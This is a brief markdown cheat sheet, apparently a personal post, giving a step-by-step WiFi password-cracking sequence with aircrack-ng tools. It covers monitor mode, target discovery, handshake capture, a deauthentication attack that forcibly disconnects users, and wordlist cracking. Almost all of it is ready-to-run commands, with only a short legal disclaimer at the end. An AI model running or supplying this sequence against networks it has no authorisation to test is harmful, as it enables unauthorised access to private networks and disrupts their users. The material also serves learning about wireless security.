# WiFi Hacking Sequence

1. **Set network card to monitor mode**

```bash
sudo airmon-ng start wlan0
Tip: Specific network card needed
Tip 2: wlan0 => WiFi

Search for the exact WiFi

sudo airodump-ng wlan0mon  # means monitor WiFi
Tip: Get BSSID (MAC) and CH (channel)

Capture (get) handshake
(handshake means the invites both send to each other to identify themselves and connect to the WiFi)

sudo airodump-ng -c <CH> --bssid <bssid> -w file_capt wlan0mon
Faster code (kick users for faster capture):

sudo aireplay-ng -0 <deauth invites int> -a <bssid> wlan0mon
Tip: -a means focus on that specific bssid

Break the password
(based on the handshake data)

aircrack-ng -w <path-to-wordlist.txt> -b <bssid> file_capt.cap
Tip: for weird passwords, use dedicated wordlist (custom)

IMPORTANT:
The listed hacking sequence is illegal and should not be used without legal access to the network from the administrator or the owner of the devices that are taking part in the sequence. Illegal actions can lead to legal consequences. Stay safe!

Note:
The text is educational only and does not encourage illegal actions.

OS: Linux OS

Make sure you have admin rights and you performed:

sudo apt install aircrack-ng
Copyright © Orestis Gatos, 2025
#Cybersecurity